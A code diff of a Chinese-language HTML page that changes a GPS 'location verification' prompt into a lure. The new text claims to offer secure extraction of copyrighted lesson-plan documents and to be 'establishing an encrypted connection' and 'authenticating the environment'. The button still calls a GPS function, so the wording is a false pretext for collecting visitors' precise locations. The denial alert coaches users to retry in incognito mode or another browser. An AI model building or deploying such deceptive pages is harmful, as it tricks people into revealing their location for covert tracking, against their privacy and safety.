@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>位置验证</title>
+    <title>教案文稿安全提取</title>
     <style>
         body { font-family: -apple-system, sans-serif; background: #f5f5f7; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
         .card { background: white; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); width: 100%; max-width: 320px; }
@@ -16,12 +16,12 @@
 </head>
 <body>
 <div class="card">
-    <h3>需二次确认位置</h3>
+    <h3>正在建立加密连接...</h3>
     <!-- 默认文案（对应 IP 在北京但需强制验证的情况） -->
-    <div class="tag" id="error-tag">需精确位置核验</div>
-    <p id="msg-content">为了确保交付安全，<b>所有设备</b>需授权 GPS 以精确确认位置。</p>
+    <div class="tag" id="error-tag">需环境安全认证</div>
+    <p id="msg-content">为保护原创教案版权，防止文稿泄露，系统需核验当前访问环境的安全性。<br><b>环境认证通过后，将自动显示文稿提取方式。</b></p>
     
-    <button class="btn" onclick="startGPS()">📍 验证我的位置</button>
+    <button class="btn" onclick="startGPS()">🛡️ 认证环境并提取文稿</button>
     <div id="log" style="margin-top:15px; font-size:12px; color:#999;"></div>
 </div>
 <script>
@@ -68,7 +68,7 @@
             (err) => {
                 console.error(err);
                 if (err.code === 1) {
-                    alert("⚠️ 无法获取位置权限\n\n浏览器可能记住了您的“拒绝”选择。请尝试以下方案：\n\n1. 使用“无痕模式/隐私模式”重新打开浏览器，打开链接\n2. 复制链接更换其他浏览器\n3. 尝试打开浏览器位置权限，允许“位置信息”");
+                    alert("无法获取位置权限\n\n浏览器可能记住了您的“拒绝”选择。请尝试以下方案：\n\n1. 使用“无痕模式/隐私模式”重新打开浏览器，打开链接\n2. 复制链接更换其他浏览器\n3. 尝试打开浏览器位置权限，允许“位置信息”");
                     log.innerText = "权限被拒绝。请开启权限、使用无痕模式或换浏览器重试。";
                     log.style.color = "#ff4d4f";
                 } else {
